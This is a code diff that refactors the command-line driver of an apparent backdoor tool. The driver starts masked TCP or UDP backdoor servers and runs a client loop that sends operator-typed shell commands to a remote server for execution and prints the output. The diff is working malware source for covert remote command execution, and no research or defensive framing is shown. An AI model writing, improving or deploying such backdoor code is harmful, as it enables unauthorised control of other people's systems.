@@ -43,56 +43,38 @@ def main():
     key = utils.make_32_byte_str(args.key) if args.key else DEFAULT_KEY
   
     if args.mode == "server":
+        mask = args.mask if args.mask else DEFAULT_MASK
         if args.protocol == "tcp":
-            mask = args.mask if args.mask else DEFAULT_MASK
             server = backdoor.TcpBackdoorServer(mask, key, pw, args.lport, args.dport)
-            server.run()
-        elif args.protocl == "udp":
-            mask = args.mask if args.mask else DEFAULT_MASK
+        elif args.protocol == "udp":
             server = backdoor.UdpBackdoorServer(mask, key, pw, args.lport, args.dport)
-            server.run()            
+        
+        server.run()
+    
     else:
         if args.protocol == "tcp":
             client = backdoor.TcpBackdoorClient(key, pw, args.lport, args.dport, args.server)
-            client.connect()
-
-            # read commands from the user until they exit
-            while True:
-                try:
-                    cmd_str = raw_input("Enter a command to execute on the server: ")
-                    cmd = command.ShellCommand(cmd_str)
-                except (EOFError, KeyboardInterrupt):
-                    print("Exiting...")
-                    cmd = command.EndCommand()
-                    client.send_command(cmd)
-                    break
-
-                # No exception - try to have the server execute this
-                client.send_command(cmd)
-                result = client.recv_result()
-                print("Received result:")
-                print(str(result))
-
-        elif args.protocl == "udp":        
+        else:
             client = backdoor.UdpBackdoorClient(key, pw, args.lport, args.dport, args.server)
-            client.connect()
 
-            # read commands from the user until they exit
-            while True:
-                try:
-                    cmd_str = raw_input("Enter a command to execute on the server: ")
-                    cmd = command.ShellCommand(cmd_str)
-                except (EOFError, KeyboardInterrupt):
-                    print("Exiting...")
-                    cmd = command.EndCommand()
-                    client.send_command(cmd)
-                    break
+        client.connect()
 
-                # No exception - try to have the server execute this
+        # read commands from the user until they exit
+        while True:
+            try:
+                cmd_str = raw_input("Enter a command to execute on the server: ")
+                cmd = command.ShellCommand(cmd_str)
+            except (EOFError, KeyboardInterrupt):
+                print("Exiting...")
+                cmd = command.EndCommand()
                 client.send_command(cmd)
-                result = client.recv_result()
-                print("Received result:")
-                print(str(result))
+                break
+
+            # No exception - try to have the server execute this
+            client.send_command(cmd)
+            result = client.recv_result()
+            print("Received result:")
+            print(str(result))
 
 if __name__ == "__main__":
     main()
